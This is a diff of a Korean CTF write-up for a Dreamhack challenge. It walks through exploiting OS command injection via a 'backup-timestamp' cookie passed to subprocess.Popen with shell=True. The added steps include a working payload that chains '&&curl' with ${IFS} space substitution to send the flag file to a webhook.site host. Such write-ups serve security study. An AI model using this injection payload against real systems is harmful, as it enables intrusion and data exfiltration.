@@ -71,6 +71,54 @@ def backup_notes(timestamp):
 
 `subprocess.Popen()`은 별도 프로세스를 실행하므로 명령어 출력이 Flask 응답에 그대로 표시되는 구조는 아니다.
 
-**정리:** 노트 생성 → `backup-timestamp` 쿠키 설정 → 쿠키 값 변경 가능 → `/backup_notes` POST → `subprocess.Popen(..., shell=True)` 실행.
+### 3. Burp Suite에서 백업 요청 잡기
 
-**취약점 원인:** 사용자 제어가 가능한 `backup-timestamp` 쿠키를 충분히 검증하지 않고 `shell=True` 명령어에 삽입하여 OS Command Injection이 발생한다.
+Burp Suite의 **Proxy → Intercept → Open browser**로 VM에 접속한다. 노트를 하나 만든 뒤 `Backup` 버튼을 누르면 `GET /backup_notes` 응답에 다음 헤더가 있다.
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: backup-timestamp=1793712120.889985; Path=/
+```
+
+백업 페이지의 `Back up` 버튼을 누르고 **Proxy → HTTP history**에서 `POST /backup_notes` 요청을 찾는다. 우클릭 → **Send to Repeater**를 누른다.
+
+HTTP history의 요청 조회 창은 수정할 수 없으므로 Repeater의 **Request → Raw**에서 편집한다.
+
+### 4. Repeater에서 Cookie 수정
+
+기존 `backup-timestamp` 쿠키를 공격용 값으로 변경한다.
+
+**수정 전**
+
+```http
+POST /backup_notes HTTP/1.1
+Host: host3.dreamhack.games:16318
+Cookie: backup-timestamp=1793712318.996075
+Content-Length: 0
+```
+
+**수정 후**
+
+```http
+POST /backup_notes HTTP/1.1
+Host: host3.dreamhack.games:16318
+Cookie: backup-timestamp=123456&&curl${IFS}-G${IFS}--data-urlencode${IFS}data@flag${IFS}https://webhook.site/6379418b-6f93-4704-a848-cde11c1b5f98
+Content-Length: 0
+```
+
+- `123456&&` : `cp` 명령이 성공하면 뒤의 명령어 실행
+- `${IFS}` : 쉘에서 공백 대신 사용하는 구분 문자
+- `-G --data-urlencode data@flag` : `flag` 파일 내용을 URL 인코딩해 GET 요청의 `data` 파라미터로 전송
+
+`data`는 직접 지정한 쿼리 파라미터 이름이고, `flag`는 읽을 파일 이름이다.
+
+### 5. Webhook.site에서 FLAG 확인
+
+Repeater에서 **Send**를 누르고 Webhook.site에서 수신된 GET 요청을 확인한다. **Query strings → data** 항목에 FLAG가 표시됐다.
+
+```text
+Query strings
+data = DH{...}
+```
+
+**취약점 원인:** 사용자가 변경할 수 있는 `backup-timestamp` 쿠키를 검증 없이 `subprocess.Popen(..., shell=True)`에 삽입하여 OS Command Injection이 발생했다.
